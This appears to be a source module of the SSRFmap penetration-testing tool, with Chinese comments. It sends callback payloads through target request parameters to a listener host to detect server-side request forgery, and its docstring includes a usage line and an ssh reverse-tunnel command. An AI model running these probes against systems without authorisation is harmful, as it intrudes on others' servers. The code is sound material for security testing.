import logging
import re
import urllib.parse

from core.handler import Handler
from core.utils import *

"""
示例:
```
~$ python3 ssrfmap.py -v -r data/request.txt -p url,path --lhost=public-ip --lport 4242 -m httpcollaborator -l http
```
如果在本地运行此模块攻击远程目标，可使用 ssh/autossh 在公网与本地 handler 之间建立远程隧道
```
~$ ssh -fN -R public-ip:4242:127.0.0.1:4242 username@public-ip
```
"""

name = "httpcollaborator"
description = "该模块通过 HTTP 协议模拟 Burp Suite Collaborator，用于检测目标参数是否存在 SSRF 漏洞"
author = "xyzkab"
documentation = []


class exploit:
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")

        # 处理 httpcollaborator 相关参数
        if args.lhost == None:
            self.SERVER_HOST = input("服务器主机:")
        else:
            self.SERVER_HOST = args.lhost

        if args.lport == None:
            self.SERVER_PORT = input("服务器端口:")
        else:
            self.SERVER_PORT = args.lport

        params = args.param.split(",")
        for param in params:
            logging.info(f"正在测试参数: {param}")
            payload = wrapper_http(f"?{param}", args.lhost, args.lport.strip())
            r = requester.do_request(param, payload)

        logging.info(f"模块 '{name}' 已结束！")
